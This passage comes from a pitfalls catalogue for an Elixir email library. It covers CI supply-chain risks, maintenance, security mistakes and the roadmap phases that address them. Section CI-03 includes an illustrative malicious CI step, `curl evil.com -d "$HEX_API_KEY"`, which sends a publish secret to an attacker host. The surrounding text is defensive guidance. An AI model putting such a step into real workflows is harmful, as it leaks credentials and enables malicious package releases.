**Citation:** `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:152-167` (two-layer matrix); `prompts/mailglass-engineering-dna-from-prior-libs.md:58-62` (concurrency, path filters, caching).

---

### CI-02: Actions Not Pinned to SHA (Supply Chain Risk)

**What goes wrong:**
A workflow uses `uses: actions/checkout@v4`. The maintainer of `actions/checkout` is compromised; a malicious commit is force-pushed to the `v4` tag. Next CI run executes the malicious code. Hex API key leaks. Malicious package version published.

**Why it happens:**
Major-tag pinning feels safe ("v4 won't break"). The reality of supply-chain attacks on GH Actions tags is recent.

**How to avoid:**
- **Pin actions to full commit SHAs** (per `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:196-201`): `uses: actions/checkout@<full-sha> # v4.1.7`.
- Pair SHA pinning with **Dependabot for `github-actions`** ecosystem so updates land as PRs that can be reviewed.
- `actionlint` workflow lane catches common GHA mistakes.
- CODEOWNERS for `.github/workflows/**` requires extra review.

**Warning signs:**
- Any `uses: actions/*@v*` (tag, not SHA).
- No `dependabot.yml` for github-actions.
- Workflow PRs merge without CODEOWNERS review.

**Phase to address:**
**v0.1 — CI/CD setup**.

**Citation:** `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:196-205` (Pin third-party actions to full SHAs; pair with Dependabot); `prompts/mailglass-engineering-dna-from-prior-libs.md:60-64` (concurrency, least privilege).

---

### CI-03: Secrets Exposed to All Jobs (Publish Secret Leak)

**What goes wrong:**
`HEX_API_KEY` is a repo-level secret available to every workflow run, including PRs. A contributor's PR adds a malicious step that does `curl evil.com -d "$HEX_API_KEY"`. The key leaks. Attacker publishes a malicious version of mailglass to Hex.

**Why it happens:**
Repo-level secrets are easier to set up than environment secrets. Authors don't draw the trust boundary at job level.

**How to avoid:**
- `HEX_API_KEY` is a **GitHub Environment secret** (e.g., `production` environment) with required reviewers, exposed only to the publish job.
- The publish workflow uses `environment: production` to gate access.
- PR jobs NEVER see publish secrets; forks NEVER trigger publish.
- `permissions: contents: read` at workflow top; jobs that need elevated permissions opt in explicitly.
- Document setup in `MAINTAINING.md`.

**Warning signs:**
- `HEX_API_KEY` referenced outside the publish job.
- The publish workflow lacks `environment:` key.
- `secrets.HEX_API_KEY` appears in any `pull_request`-triggered workflow.

**Phase to address:**
**v0.1 — CI/CD setup + MAINTAINING.md runbook**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:64-66,712-714` (secrets discipline); `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:188-205` (least privilege + GitHub Environments).

---

### CI-04: Docs Build Not Gated (Broken Examples Ship to HexDocs)

**What goes wrong:**
A function is renamed; the README still references the old name. `mix docs` succeeds (no warnings about README content). HexDocs publishes broken Quick Start. Adopters copy-paste, fail, file issues.

**Why it happens:**
`mix docs` doesn't validate code blocks in markdown; it only renders.

**How to avoid:**
- **`mix docs --warnings-as-errors`** in CI (per `PROJECT.md:48` and `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:130-133`).
- **Doc-contract tests** (TEST-04 above) extract code from README + guides and assert it parses + functions exist.
- A `verify.docs` mix task chains `mix docs --warnings-as-errors` + `mix test --only docs_contract`.
- HexDocs preview: a CI lane uploads the docs build as an artifact for visual inspection on PRs touching guides.

**Warning signs:**
- `mix docs` produces warnings that get ignored.
- HexDocs has examples that don't compile.
- The CI lane for docs is missing or non-blocking.

**Phase to address:**
**v0.1 — CI/CD setup**.

**Citation:** `PROJECT.md:48` (mix docs --warnings-as-errors gate); `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:130-133` (docs build as a gate); `prompts/mailglass-engineering-dna-from-prior-libs.md:51-52` (lint lane includes docs).

---

### CI-05: `mix hex.audit` Not Run (Retired Deps Merged)

**What goes wrong:**
A dependency is retired on Hex (security issue, abandonment). The lib's `mix.lock` still resolves to it. Adopters install and get a deprecated dep with known CVEs.

**Why it happens:**
`mix hex.audit` is a manual command; nobody runs it.

**How to avoid:**
- **`mix hex.audit` in CI lint lane** (per `PROJECT.md:48`); exits nonzero on retired deps, blocks merge.
- Dependabot for Mix ecosystem opens PRs for security advisories on direct deps.
- `MAINTAINING.md` documents the policy: retired deps require either replacement or an explicit `# audit-ack` comment with an issue link.

**Warning signs:**
- `mix hex.audit` fails locally but CI doesn't catch it.
- A dep in mix.lock has a "retired" badge on Hex.
- No dependabot.yml for Mix ecosystem.

**Phase to address:**
**v0.1 — CI/CD setup**.

**Citation:** `PROJECT.md:48` (mix hex.audit in CI); `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:135-140` (Hex audit lane).

---

### CI-06: Missing `mix compile --no-optional-deps --warnings-as-errors`

**What goes wrong:**
Optional deps (Oban, OpenTelemetry, mrml) are referenced from non-gated code. A user without those deps installs mailglass, gets compile warnings or `UndefinedFunctionError`. The lib's CI doesn't catch this because all deps are present in CI.

**Why it happens:**
Default `mix compile` includes optional deps. The "without optional deps" path is non-default and forgotten.

**How to avoid:**
- **CI lane: `mix compile --no-optional-deps --warnings-as-errors`** (per `PROJECT.md:137` and `prompts/elixir-opensource-libs-best-practices-deep-research.md:421-425`).
- This lane runs in MIX_ENV=test to also catch test-time references.
- DIST-04's OptionalDeps gateway pattern eliminates 95% of these issues; this CI lane is the safety net for the remaining 5%.

**Warning signs:**
- The CI lane doesn't include `--no-optional-deps`.
- Adopters report `UndefinedFunctionError` for optional deps.
- Compile warnings about undefined Oban/OpenTelemetry symbols.

**Phase to address:**
**v0.1 — CI/CD setup**.

**Citation:** `PROJECT.md:137` (CI must pass `mix compile --no-optional-deps --warnings-as-errors`); `prompts/elixir-opensource-libs-best-practices-deep-research.md:419-425`.

---

### MAINT-01: Scope Creep Into Marketing or Notifications

**What goes wrong:**
A user files an issue: "Can mailglass send a campaign to a list of subscribers?" The maintainer thinks "small feature, why not." Six months later, mailglass has half a Mailcoach-equivalent inside it. Compliance surface area doubles. Out-of-scope items in `PROJECT.md` are forgotten.

**Why it happens:**
Marketing-vs-transactional is a slippery slope. Each feature looks small. Saying no feels rude.

**How to avoid:**
- `PROJECT.md` Out of Scope section (`PROJECT.md:84-99`) is the **canonical reference** for "is this in scope?" Maintainer cites D-03 / D-04 in issue replies.
- New issue template requires the user to assert "this is for transactional/operational mail, not marketing/campaigns."
- Quarterly review of issues filed: anything with marketing/campaign scope auto-labeled `out-of-scope` and pointed at Keila / Listmonk.
- A feature requested 3+ times that's plausibly in-scope-adjacent is moved to `milestone-candidates.md` Tier C ("defer until failure proven") — not implemented.

**Warning signs:**
- Issue title contains "campaign", "newsletter", "broadcast", "drip", "segment", "A/B test".
- A PR adds tables for "subscribers" or "lists" beyond suppression scope.
- Maintainer time on compliance/provider work drops below 20% (means scope crept into product).

**Phase to address:**
**Continuous — every milestone retro reviews scope adherence.**

**Citation:** `PROJECT.md:84-99` (Out of Scope section, D-03 marketing email permanently out, D-04 multi-channel out); `prompts/Phoenix needs an email framework not another mailer.md:396-410` (scope creep is the largest risk).

---

### MAINT-02: One-Person Bus Factor

**What goes wrong:**
Jonathan is the sole maintainer (per `PROJECT.md:145`). He gets hit by a bus / sabbatical / new job. mailglass goes unmaintained. Compliance changes (Gmail/Yahoo rule updates) don't ship. Adopters migrate away. The lib joins Bamboo's "maintenance mode" graveyard.

**Why it happens:**
OSS solo maintainership is the default. Co-maintainers don't appear unless actively recruited.

**How to avoid:**
- `MAINTAINING.md` documents EVERYTHING (release runbook, secret setup, branch protection, rotation policy) so a successor can take over.
- v0.1 must be **coastable for 6 months without releases** (per `PROJECT.md:145`) — minimal forced upgrades, conservative APIs.
- Recruit a co-maintainer by v0.5: identify high-engagement issue contributors, offer commit access after consistent quality contributions.
- All "tribal knowledge" lives in `prompts/`, `.planning/`, `MAINTAINING.md`, NOT in maintainer's head.
- If solo for >12 months, evaluate handing off to BEAM Community or sunsetting gracefully.

**Warning signs:**
- Issues sit >2 weeks without response.
- Compliance changes (e.g., 2026 Gmail rule update) ship 60+ days after announcement.
- No commit activity for >30 days.

**Phase to address:**
**Continuous; explicit retro question at every milestone.**

**Citation:** `PROJECT.md:145` (one-person maintainer realistic); `prompts/Phoenix needs an email framework not another mailer.md:407-409` (one-person maintainership risk).

---

### MAINT-03: Provider/Compliance Churn Underestimated

**What goes wrong:**
Maintainer plans 100% of time on features. Reality: 20-30% goes to provider API changes (SendGrid retires endpoint, Mailgun changes auth) and compliance updates (Gmail policy update, RFC clarification). Feature work slips. Adopters file "is this still maintained?" issues.

**Why it happens:**
Optimism bias. Provider/compliance work feels invisible compared to features.

**How to avoid:**
- **Budget 20-30% of maintenance time forever for provider/compliance churn** (per `PROJECT.md:145`). Document this in `MAINTAINING.md`.
- Subscribe to provider release notes / RFC updates / postmaster blogs (Postmark, SendGrid, Mailgun, Resend, Gmail, Yahoo, Microsoft).
- Quarterly `mix mail.doctor` health check against own dogfood deployment — catches drift early.
- Compliance changes are A-tier in `milestone-candidates.md`, even if dull.
- A `MAINTAINING.md` checklist for every release: "Have any provider APIs changed in the past quarter? Are RFC/policy updates pending?"

**Warning signs:**
- Maintainer planning has zero buffer for unplanned work.
- Adopters notice provider issues before maintainer does.
- A compliance update lands months after the policy change.

**Phase to address:**
**Continuous; explicit budget in MAINTAINING.md from v0.1.**

**Citation:** `PROJECT.md:145` (provider/compliance churn is expected to consume 20–30% of maintenance time forever); `prompts/Phoenix needs an email framework not another mailer.md:398` (~20–30% of maintenance time on compliance/provider drift alone).

---

### MAINT-04: Pre-1.0 Breaking Changes Batched With Features

**What goes wrong:**
A v0.4 release includes a renamed function AND a new feature, both as "minor" bump. Adopters upgrade for the feature, hit the rename, can't tell what broke. Pre-1.0 contracts are vague; users blame the lib.

**Why it happens:**
"It's pre-1.0, semver doesn't apply" — wrong. Pre-1.0 minor bumps still need clear breaking-change signals.

**How to avoid:**
- **Pre-1.0 versioning rule** (per `prompts/mailglass-engineering-dna-from-prior-libs.md:73-74` and `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:241`): new public modules/functions = minor bump. **Removals/renames also = minor bump, but in a SEPARATE release from feature additions.**
- CHANGELOG entries flag breaking changes prominently (`### BREAKING` section) even pre-1.0.
- Migration guide updated for every breaking change, with `:since` and `:deprecated` annotations on functions.
- A NimbleOptions schema deprecation (`deprecated: "use foo_v2 instead"`) gives a release cycle of warning before removal.
- Post-1.0: `@deprecated` in current major; removal in next major (per lattice_stripe `api_stability.md`).

**Warning signs:**
- A single release adds a feature AND removes a function.
- The CHANGELOG entry doesn't flag the rename.
- Adopter issue: "I upgraded for feature X and Y broke."

**Phase to address:**
**v0.1 — `api_stability.md` documents the policy**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:73-76,719-721` (pre-1.0 versioning is strict; gotcha §6 item 17); `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:241` (Hex requires SemVer; pre-1.0 breaking = minor bump); `PROJECT.md:82` (api_stability.md backwards-compatibility discipline).

---

### MAINT-05: Discord/Slack Support Replacing GitHub Issues (No Audit Trail)

**What goes wrong:**
Maintainer sets up a Discord. Users ask questions there. Bugs are reported in chat. Nothing is recorded as issues. Six months later, the maintainer (or a successor) can't grep history for "did we ever fix that bounce-classification edge case?" — the answer existed in Discord and is lost.

**Why it happens:**
Real-time chat feels welcoming. Issues feel formal. Users prefer chat.

**How to avoid:**
- **GitHub Issues is the canonical bug/feature tracker.** Discussions for Q&A. Discord/Slack (if any) explicitly for community chat — bugs MUST be filed as issues.
- Issue templates make filing easy (bug template, feature request template, security template).
- A pinned message in any chat room: "Found a bug? File an issue → link." With a polite redirect bot.
- `CONTRIBUTING.md` documents the channels and what each is for.
- Maintainer-time discipline: refuse to debug bugs in chat; respond with "please file an issue with [info]."

**Warning signs:**
- Bug fix commits with no linked issue.
- Maintainer answers the same question multiple times in chat.
- Users say "I asked in Discord but nothing happened."

**Phase to address:**
**v0.1 — `CONTRIBUTING.md` channel policy documented from launch.**

**Citation:** Field knowledge informed by `prompts/mailglass-engineering-dna-from-prior-libs.md:42` (project root files: CONTRIBUTING.md, CODE_OF_CONDUCT.md, SECURITY.md as standard).

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip Fake adapter, use Mox | Faster v0.1 ship | Mock/real drift; bugs found in prod | **Never** for adapter — Fake is the release gate (D-13) |
| Use one giant `use Mailglass` macro | Less adopter boilerplate | Compile times, opaque stack traces, bus factor | Never — narrow `@behaviour` always |
| Default tracking on | Match ESP industry default | Legal liability on auth messages, GDPR risk | Never (D-08) |
| Single CHANGELOG hand-written | Manual control | Drift with Release Please; broken releases | Only the `Unreleased` section, by exception |
| Auto-include all repo files in Hex package | Less mix.exs config | Ships test/ fixtures, bloats package, leaks paths | Never — explicit `files:` whitelist always |
| Skip docs-contract tests | Faster docs writing | Silent drift; broken Quick Starts ship | Only if README has zero code examples (impossible for this lib) |
| Hex publish from any branch | Easier release ergonomics | Supply-chain vulnerability via PR-based attack | Never — protected ref + environment-gated |
| Real-provider tests as PR gate | "Realistic" coverage | Flaky CI, costs $, blocks contributors | Never — advisory only |
| Skip property tests on signing | Faster v0.1 | Latent crypto bugs, subtle replay holes | Never — property tests for signing/idempotency are v0.1 gate |
| `Application.compile_env!` for adapter selection | Compile-time validation feels safe | Releases need rebuild on rotation | Only for build-invariants (e.g., `:prod` env check) |
| Single-tenant in v0.1, retrofit later | Faster validation | Tenant boundary bugs across every query, rewrite needed | Never — multi-tenancy first-class from v0.1 (D-09) |
| Marketing email as "small extension" | Adjacent feature | Doubles compliance + maintenance surface | Never (D-03) |

---

## Integration Gotchas

Common mistakes when connecting to external services.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Postmark webhook | Trust IP allowlist alone for auth | Use Basic Auth + IP allowlist (Postmark has no HMAC) |
| SendGrid webhook | Use HMAC-SHA256 verifier | SendGrid uses ECDSA — wrong algo silently fails |
| Mailgun webhook | Verify signature without timestamp tolerance | Mailgun signature includes timestamp; reject >5min skew |
| SES inbound | Treat as webhook | SES uses SNS subscription; verify SNS signature, handle subscription confirmation |
| Resend webhook | Skip signature verification ("it's HTTPS") | Resend signs every event; verify or reject |
| Oban (optional dep) | `Oban.insert/2` directly | Wrap in `Mailglass.OptionalDeps.Oban`; fall back to Task.Supervisor |
| OpenTelemetry | Reference `:opentelemetry_api` directly | Gateway module + `Code.ensure_loaded?/1` + `@compile {:no_warn_undefined, ...}` |
| Premailex | Run on every render even when CSS is already inline | Cache by template-key + assigns hash; render-time check |
| Phoenix.PubSub | Bare topic strings | `"mailglass:#{tenant}:#{kind}:#{subject_id}"` always |
| Ecto Sandbox | Forget `:shared` mode for cross-process tests | Webhook plug → handler runs in another process; need shared sandbox |
| mrml NIF (optional) | Hard-required for MJML rendering | MJML is opt-in `Mailglass.TemplateEngine.MJML`; HEEx is default (D-18) |
| Sigra (optional) | Hard-coded auth dispatch | `Mailglass.Auth` adapter behaviour; auto-detect Sigra if loaded |
| Phoenix scopes | Ignore Phoenix 1.8 `scope` defaults | `Mailglass.Tenancy.scope/2` aligned with Phoenix 1.8 conventions (D-09) |

---

## Performance Traps

Patterns that work at small scale but fail as usage grows.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| GenServer in send hot path | Throughput plateau, mailbox growth | Pure functions for render/send; GenServer only for rate limiting | ~50 concurrent senders |
| Repo.all on `mailglass_events` for admin | Slow LiveView, OOM | Indexed pagination via Flop on `(tenant_id, occurred_at DESC)` | ~100K events |
| Suppression check via Repo.exists?/1 per send | 1 extra DB roundtrip per send | Bloom filter cache (ETS) with refresh; suppress check is hot path | ~10K sends/min |
| Webhook handler synchronous | Provider retries on slow handler | Dispatch to Oban; ack 200 immediately | ~1K webhooks/min |
| Telemetry handler does Repo work | Backpressure on send pipeline | Telemetry handlers ENQUEUE work via Oban, never do work synchronously | ~100 events/sec |
| Per-tenant adapter resolved per-send via Repo | DB hit per send | Cache resolver result per tenant for short TTL | ~1K sends/min |
| Broad LiveView re-render on every event | Admin UI thrashing | Use Phoenix.LiveView.streams/1 for the sent-mail list | ~1K visible rows |
| MIME parsing in caller process for inbound | Memory spike, blocked process | Inbound parsing in a Task with bounded memory + size limit | ~10MB messages |
| Append-only ledger without partitioning | Index bloat, vacuum churn | Plan PG table partitioning by `occurred_at` month | ~10M events |
| Tracking pixel handler hits Repo per request | DB write per pixel load | Aggregate writes via batched inserts | ~100 pixel loads/sec |

---

## Security Mistakes

Domain-specific security issues beyond general web security.

| Mistake | Risk | Prevention |
|---------|------|------------|
| Store webhook secrets in compile-time config | Rotation requires redeploy; secrets in `.beam` | Runtime config + secrets fetcher tuple `{Module, :fn, [arg]}` |
| Skip webhook signature verification on staging | Forged webhooks corrupt staging state | Verify everywhere; staging uses provider sandbox creds, not "no verify" |
| Tracking pixel URL contains raw email | PII in logs/referrers; enumeration attack | Phoenix.Token-signed opaque token only |
| Click rewriter on brand apex domain | Cookie scope leak; reputation | Dedicated subdomain (`track.brand.com`); never apex |
| Open-redirect in click handler | Attacker phishes from your domain | Validate redirect target against signed token's allowed list |
| Unsubscribe token = base64(email) | Trivial enumeration; no rotation | `Phoenix.Token.sign/3` with `:max_age`, secret rotation |
| Admin LiveView bypasses tenant scope | Cross-tenant data leak | `NoUnscopedTenantQueryInLib` Credo check; multi-tenant property test |
| Inbound email auto-incinerated without retention policy | GDPR SAR fails (data already deleted but referenced) | Document retention; allow config; provide SAR export task |
| Suppress recovery via API without audit | Stealth resurrection of bad addresses | All unsuppress actions emit audit event + require step-up auth |
| Logging full provider responses | Recipient PII in logs | Log IDs/statuses only; full payload in `mailglass_events.payload` (DB-only) |
| Webhook plug parses body before signature verify | Forged signature can trigger parser DoS | `CachingBodyReader` preserves raw bytes; verify before parse |
| Forged signature error rescued | Silent acceptance of malicious webhooks | `Mailglass.SignatureError` raises at call site, no rescue (D-08-equivalent) |
| Per-tenant adapter creds in environment vars | Variable explosion; hard to rotate | Tenant-keyed secrets via the resolver tuple pattern |
| Render user-provided HTML without sanitization | Stored XSS on admin LiveView preview | HEEx escapes by default; raw inbound HTML rendered in sandboxed `<iframe srcdoc>` |
| Magic-link emails with click tracking | Tracking server can replay link before user | Block tracking on auth-stream messages (Credo check) |

---

## UX Pitfalls

Common user experience mistakes in this domain.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Preview dashboard requires manual refresh | Dev sees stale render after assigns change | Phoenix.LiveView auto-refreshes on template change AND on assigns form input |
| Admin event timeline shows raw provider event names | Operator confused by inconsistent vocabulary | Anymail taxonomy verbatim with human descriptions (D-14) |
| Suppression UI doesn't show scope | Operator unsuppresses one address, doesn't realize tenant boundary | Show `(scope, reason, source)` triple on every row; require confirm on bulk |
| Error messages are stack traces | Operator can't fix without engineer | `Mailglass.Error` has `:type` + human `message/1`: "Delivery blocked: recipient on suppression list (added 2026-04-15 from Postmark complaint)" |
| `mix mailglass.install` outputs giant diff with no explanation | Adopter overwhelmed; rolls back | Output a manifest of files created + reasons; conflict sidecars on rerun |
| `mix mail.doctor` reports `pass`/`fail` only | Operator can't act on failures | Each check shows: status, what was checked, expected vs actual, remediation link |
| Admin LiveView mobile-broken | Ops on-call from phone can't triage | Mobile-first responsive (`PROJECT.md:77`) — test at 320px width |
| Webhook event log scroll without filter | Operator can't find specific failure | Search by message_id, recipient, status; date range; provider; tenant |
| Resend button without confirmation | Accidental duplicate sends | Confirmation modal showing original recipients + warning about duplicates |
| Preview shows desktop only | Devs ship emails broken on mobile | Device toggle (320/480/600/768) baked into preview LiveView (`PROJECT.md:38`) |
| Dark-mode preview missing | Devs ship invisible text in dark mode | Dark toggle in preview (`PROJECT.md:38`) |
| HTML/Text/Raw/Headers tabs missing | Devs can't debug deliverability | All four tabs in preview LiveView (`PROJECT.md:38`) |

---

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Webhook handler:** Often missing signature verification on staging — verify all environments verify
- [ ] **Webhook handler:** Often missing idempotency on the event ledger insert — verify UNIQUE constraint + transaction
- [ ] **Webhook handler:** Often missing 200 response on replay — verify provider stops retrying
- [ ] **Suppression check:** Often missing tenant scope — verify `Mailglass.Tenancy.scope/2` invocation
- [ ] **Suppression check:** Often missing pre-send hook in deliver pipeline — verify `Mailglass.Suppression.check_before_send/1` runs
- [ ] **Tracking pixel:** Often missing HTTPS-only enforcement — verify URL builder rejects http://
- [ ] **Tracking pixel:** Often missing signed-token validation — verify Phoenix.Token round-trip test
- [ ] **Click rewriter:** Often missing dedicated subdomain — verify config requires subdomain != apex
- [ ] **Click rewriter:** Often missing skip on auth-stream — verify Credo check fires
- [ ] **List-Unsubscribe:** Often missing `List-Unsubscribe-Post` header — verify both headers always emitted together
- [ ] **List-Unsubscribe:** Often missing DKIM `h=` tag inclusion — verify signed test
- [ ] **DKIM rotation:** Often missing dual-publish window — verify `mix mail.doctor` warns on solo selector
- [ ] **`mailglass_events`:** Often missing immutability trigger — verify SQLSTATE 45A01 raised on UPDATE/DELETE
- [ ] **`mailglass_events`:** Often missing idempotency UNIQUE partial index — verify schema migration
- [ ] **Multi-tenancy:** Often missing scope on admin queries — verify `NoUnscopedTenantQueryInLib` Credo check passes
- [ ] **Admin LiveView:** Often missing mobile-responsive layout — verify at 320px width
- [ ] **Admin LiveView:** Often missing tenant context display — verify breadcrumb shows current tenant
- [ ] **Telemetry events:** Often missing 4-level naming — verify all events match `[:mailglass, :domain, :resource, :action]`
- [ ] **Telemetry meta:** Often missing PII scrub — verify `NoPiiInTelemetryMeta` Credo check + property test
- [ ] **Optional deps:** Often missing `Code.ensure_loaded?/1` gate — verify `mix compile --no-optional-deps` passes
- [ ] **`mix mailglass.install`:** Often missing idempotent rerun — verify second run produces no diff
- [ ] **`mix mailglass.install`:** Often missing conflict sidecars — verify modified target produces `.mailglass_conflict_*`
- [ ] **Sibling packages:** Often missing linked-version check — verify `mailglass_admin` pinned to exact `mailglass` version
- [ ] **Hex publish:** Often missing protected-ref gate — verify publish workflow has `environment:` key
- [ ] **CHANGELOG:** Often missing breaking-change flag pre-1.0 — verify entries flag removals/renames
- [ ] **Property tests:** Often missing on signature verification — verify StreamData test exists
- [ ] **Property tests:** Often missing on idempotency keys — verify replay-safety property test exists
- [ ] **Doctest contracts:** Often missing README extraction — verify `docs_contract_test.exs` covers Quick Start
- [ ] **Migration:** Often missing FK to adopter tables — verify polymorphic `(owner_type, owner_id)` used
- [ ] **Migration:** Often missing per-package timestamp prefix — verify stable ordering
- [ ] **Webhook plug:** Often missing `CachingBodyReader` — verify raw body preserved for HMAC

---

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Tracking on auth message shipped to prod (MAIL-01) | HIGH | Hot-fix to disable tracking on auth-stream; rotate any leaked URLs; legal review; CHANGELOG flag; `Mailglass.Credo.NoTrackingOnAuthStream` lint added |
| List-Unsubscribe-Post missing (MAIL-02) | MEDIUM | Patch release that auto-injects; deploy; monitor Postmaster Tools for recovery; send-volume hold during reputation rebuild |
| Webhook idempotency missing (MAIL-03) | MEDIUM | Add UNIQUE constraint via migration; backfill `idempotency_key`; deduplicate ledger; recompute analytics rollups |
| SPF >10 lookups (MAIL-04) | LOW | `mail.doctor` patch to count lookups; customer rewrites SPF (out of lib's hands); add to docs |
| DKIM rotation broke deliveries (MAIL-05) | HIGH | Re-publish old selector; wait for receiver-cache TTL; document dual-publish runbook; add `mail.doctor` warning |
| Suppression scope leak (MAIL-07) | HIGH | Audit suppressions table; add `scope` column with safe default (`:tenant_address`); manual review of overly-broad rows; multi-tenant property test added |
| Bounce misclassification (MAIL-08) | MEDIUM | Per-provider mapper fix; reclassify historical events from raw payloads; manual unsuppression of misclassified addresses |
| Provider message_id collision (MAIL-09) | HIGH | Migration to add `provider` to UNIQUE index; data migration to backfill; deploy with downtime window |
| Sibling version drift (DIST-01) | MEDIUM | Coordinated patch release; pin sibling deps to exact versions; CI sibling-compat check added |
| Admin assets stale (DIST-02) | LOW | Rebuild + commit; deploy patch; CI `git diff --exit-code` lane added |
| Installer clobbered customizations (DIST-03) | HIGH (per-user) | Document recovery from VCS history; sidecar pattern shipped in next patch |
| Hex published from PR (DIST-05) | CRITICAL | Yank malicious version (`mix hex.retire`); rotate API key; security advisory; environment-gated publish enforced |
| Tenant data leak (PHX-05) | CRITICAL | Audit affected queries; notify customers per breach policy; `NoUnscopedTenantQueryInLib` Credo check added; multi-tenant property test added |
| PubSub topic collision (PHX-06) | LOW | Rename topics with prefix; coordinate with adopter; Credo check added |
| PII in telemetry (OBS-01) | HIGH | Audit downstream observability vendors; request PII purge per GDPR; Credo check added; emit-site review |
| Telemetry handler raised (OBS-02) | MEDIUM | Wrap mailglass emit sites in try/rescue; document for adopters; emergency patch |
| Provider/compliance churn missed (MAINT-03) | HIGH | Emergency patch; backfill; postmaster reputation rebuild; budget reset for ongoing churn |
| Pre-1.0 breaking change batched (MAINT-04) | MEDIUM | Document migration; offer compat shim if feasible; explicit BREAKING-CHANGE entry retroactively |

---

## Pitfall-to-Phase Mapping

How roadmap phases should address these pitfalls.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| LIB-01 (macro abuse) | Phase 0 — API design lock; v0.1 lint lane | `Mailglass.Credo.NoOversizedUseInjection`; `mix xref trace` smoke |
| LIB-02 (compile-dep explosion) | Phase 0 — Config module | `Mailglass.Credo.NoCompileEnvOutsideConfig`; `mix xref graph` stats |
| LIB-03 (return-type variance) | Phase 0 — `api_stability.md` | Doctest per (function, return-shape); ExDoc `@spec` review |
| LIB-04 (forced exceptions) | Phase 0 — error model lock | Closed `:type` atom set; tuple-API doctest coverage |
| LIB-05 (singleton globals) | Phase 0 — supervision tree design | `Mailglass.Credo.NoDefaultModuleNameSingleton`; multi-instance property test |
| LIB-06 (GenServer scattering) | Phase 0 + Phase 1 (outbound core) | Pure-function bias; centralized GenServer wrappers |
| LIB-07 (`compile_env!` for runtime) | Phase 0 — Config module | `Mailglass.Credo.NoCompileEnvForRuntimeSettings` |
| MAIL-01 (tracking on auth) | v0.1 (off-by-default) + v0.5 (Mailable Credo check) | `Mailglass.Credo.NoTrackingOnAuthStream`; D-08 guide section |
| MAIL-02 (List-Unsubscribe-Post missing) | v0.5 — Compliance | `Mailglass.Credo.RequiredListUnsubscribeHeaders`; integration test asserts both headers + DKIM signing |
| MAIL-03 (webhook idempotency) | v0.1 (UNIQUE index) + v0.5 (handler) | StreamData replay-safety property test; webhook integration test |
| MAIL-04 (SPF >10 lookups) | v0.5 — `mix mail.doctor` | Property test on synthesized SPF records; doctor output review |
| MAIL-05 (DKIM rotation) | v0.5 — DKIM helper + rotation runbook | `mail.doctor` selector check; runbook in `guides/dkim-rotation.md` |
| MAIL-06 (tracking pixel security) | v0.5 — tracking opt-in primitives | `Mailglass.Credo.NoPiiInTrackingUrls`; pixel handler tests for HTTPS + signed token |
| MAIL-07 (suppression scope) | v0.5 — `Mailglass.Suppressions` | `:scope` column required; multi-tenant property test; admin step-up auth on bulk |
| MAIL-08 (bounce classification) | v0.5 — Webhooks (Postmark/SendGrid v0.1; Mailgun/SES/Resend v0.5) | Per-provider mapper exhaustiveness test; recorded fixture corpus |
| MAIL-09 (provider_message_id collision) | v0.1 — Schema design | Migration test asserts `(provider, provider_message_id)` UNIQUE |
| DIST-01 (sibling version drift) | v0.1 — Release Please config | `verify.sibling_compat` mix task; linked-version Release Please plugin |
| DIST-02 (priv/static drift) | v0.1 + v0.5 — admin-drift-docs lane | `git diff --exit-code` after asset build |
| DIST-03 (installer non-idempotent) | v0.1 — Installer + golden-diff CI | Idempotency golden test; conflict-sidecar test |
| DIST-04 (optional deps not gated) | v0.1 — OptionalDeps gateway pattern | `mix compile --no-optional-deps --warnings-as-errors` lane; `Mailglass.Credo.NoBareOptionalDepReference` |
| DIST-05 (Hex publish from PR) | v0.1 — CI/CD | Environment-gated publish workflow; secret scope review |
| DIST-06 (CHANGELOG conflict) | v0.1 — `MAINTAINING.md` | CHANGELOG header comment; Release Please parser CI check |
| PHX-01 (other-app env reads) | Phase 0 — Config module | `Mailglass.Credo.NoOtherAppEnvReads` |
| PHX-02 (router conflicts) | v0.1 — `mailglass_admin` router macro | Path argument required; PubSub topic prefix |
| PHX-03 (assets in core lib) | v0.1 — Sibling package boundary | Hex tarball size CI lane; explicit `files:` whitelist |
| PHX-04 (migration ordering) | v0.1 — Schema design + v0.5+ inbound | Polymorphic ownership; per-package migration subdirs; copy task |
| PHX-05 (admin tenant leak) | v0.1 — Tenancy primitives + v0.5 admin | `Mailglass.Credo.NoUnscopedTenantQueryInLib`; multi-tenant property test |
| PHX-06 (PubSub topic collision) | v0.1 — Telemetry/PubSub design | `Mailglass.Credo.PrefixedPubSubTopics`; centralized broadcast helper |
| OBS-01 (PII in telemetry) | v0.1 — Telemetry design | `Mailglass.Credo.NoPiiInTelemetryMeta`; whitelist property test |
| OBS-02 (raise from telemetry) | v0.1 — Telemetry module | `try/rescue` at emit sites; "telemetry handler raises" property test |
| OBS-03 (OpenTelemetry not gated) | v0.1 — OptionalDeps gateway | `--no-optional-deps` lane catches |
| OBS-04 (event naming inconsistent) | v0.1 — Telemetry wrapper | `Mailglass.Credo.TelemetryEventConvention`; `mix xref` event-list extraction |
| OBS-05 (response payloads in logs) | v0.1 — logging conventions | `Mailglass.Credo.NoFullResponseInLogs`; structured metadata only |
| TEST-01 (mock vs Fake) | v0.1 — Fake adapter as gate | Fake-backed full test suite as release gate (D-13) |
| TEST-02 (real-provider as gate) | v0.1 — CI lane structure | Real-provider tests on cron + workflow_dispatch only |
